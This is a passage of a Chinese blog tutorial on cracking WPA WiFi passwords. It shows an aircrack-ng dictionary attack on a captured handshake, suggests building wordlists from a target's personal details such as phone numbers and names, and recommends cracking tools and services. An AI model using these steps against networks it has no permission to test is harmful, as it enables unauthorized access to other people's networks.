+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>抓包握手包之后，接着就是破解了，这个才是重点,</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo aircrack-ng -w pass.txt 403-01.cap</span><br><span class="line">			参数解释：-w 字典路径</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv2ksg4sj20ll03uwge.jpg" alt=""></p>
+<p>上图是pass.txt 内的密码，YXGY41403为正确的wifi密码,当使用aircrack-ng执行暴力破解后,可看到密码被找到了</p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3xtm05j20lo0c045z.jpg" alt=""></p>
+<p>这里只是为了演示，其实暴力破解是非常费时费力的,花了大力气，如果密码不在字典内，多久都是白费，所以要尽可能的想到与目标wifi相关联的信息，比如门牌号,手机号码,姓名等信息去生成字典，缩小密码的范围，不然只能换种方法或者放弃了。</p>
+<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><h3 id="EWSA-WPA无线密码破解利器"><a href="#EWSA-WPA无线密码破解利器" class="headerlink" title="EWSA  WPA无线密码破解利器"></a><a href="https://www.elcomsoft.com/ewsa.html" target="_blank" rel="noopener">EWSA</a>  WPA无线密码破解利器</h3><p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3bdm4gj20p10eogm8.jpg" alt=""></p>
+<h3 id="HashCat-GPU破解神器"><a href="#HashCat-GPU破解神器" class="headerlink" title="HashCat  GPU破解神器"></a><a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">HashCat</a>  GPU破解神器</h3><h3 id="GpuHash-在线破解"><a href="#GpuHash-在线破解" class="headerlink" title="GpuHash 在线破解"></a>GpuHash 在线破解</h3><p><a href="https://gpuhash.me/" target="_blank" rel="noopener">https://gpuhash.me/</a>     收费</p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3ptuqqj20h90b0tgs.jpg" alt=""></p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv44nj4tj20hb08vdmt.jpg" alt=""></p>
+<p><img src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1ftxv3q7y6dj20hs0bbq89.jpg" alt=""></p>
+<blockquote>
+<p><a href="http://www.freebuf.com/articles/wireless/58342.html" target="_blank" rel="noopener">WPA-PSK无线网络破解原理及过程</a></p>
+<p><a href="https://github.com/Xu-Jian/Wifi-Crack/blob/master/Wifi%E7%A0%B4%E8%A7%A3.rst" target="_blank" rel="noopener">Wifi破解</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/无线安全/" rel="tag"># 无线安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/9a246216/" rel="next" title="观察者模式">
+                <i class="fa fa-chevron-left"></i> 观察者模式
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/2f57a694/" rel="prev" title="正则表达式">
+                正则表达式 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMTU3NS84MTM5"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://ws1.sinaimg.cn/large/7bf9f3e8gy1fpjlw6duhzj2046046a9x.jpg"
+                alt="Xie sm" />
+            
+              <p class="site-author-name" itemprop="name">Xie sm</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="http://aicat.life" target="_blank" title="微博">
+                      
+                        <i class="fa fa-fw fa-globe"></i>微博</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hexo.io" title="Hexo" target="_blank">Hexo</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.v2ray.com" title="v2ray" target="_blank">v2ray</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jm.taobao.org" title="阿里中间件" target="_blank">阿里中间件</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备"><span class="nav-number">1.</span> <span class="nav-text">准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Aircrack-ng介绍"><span class="nav-number">1.1.</span> <span class="nav-text">Aircrack-ng介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#组件"><span class="nav-number">1.2.</span> <span class="nav-text">组件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简单教程"><span class="nav-number">1.3.</span> <span class="nav-text">简单教程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#airodump-ng-命令"><span class="nav-number">1.3.1.</span> <span class="nav-text">airodump-ng 命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#aircrack-ng命令"><span class="nav-number">1.3.2.</span> <span class="nav-text">aircrack-ng命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扫描"><span class="nav-number">2.</span> <span class="nav-text">扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓取"><span class="nav-number">3.</span> <span class="nav-text">抓取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#破解"><span class="nav-number">4.</span> <span class="nav-text">破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#推荐"><span class="nav-number">5.</span> <span class="nav-text">推荐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EWSA-WPA无线密码破解利器"><span class="nav-number">5.1.</span> <span class="nav-text">EWSA  WPA无线密码破解利器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HashCat-GPU破解神器"><span class="nav-number">5.2.</span> <span class="nav-text">HashCat  GPU破解神器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GpuHash-在线破解"><span class="nav-number">5.3.</span> <span class="nav-text">GpuHash 在线破解</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xie sm</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">14.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("RoesMJqmeteJ3DjNAcmIopEi-gzGzoHsz", "nTz5feq65Pe1hJFHcAsfBB8A");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
